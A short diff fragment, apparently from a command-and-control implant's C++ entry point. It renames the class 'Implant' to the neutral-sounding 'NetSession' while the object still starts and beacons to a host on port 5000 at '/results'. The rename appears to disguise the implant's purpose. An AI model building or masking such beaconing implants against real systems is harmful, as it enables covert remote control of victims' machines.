@@ -9,7 +9,7 @@ int main()
     const auto port = "5000";
     const auto uri = "/results";
 
-    Implant implant{ host, port, uri };
+    NetSession implant{ host, port, uri };
     implant.start();
     try {
         implant.beacon();
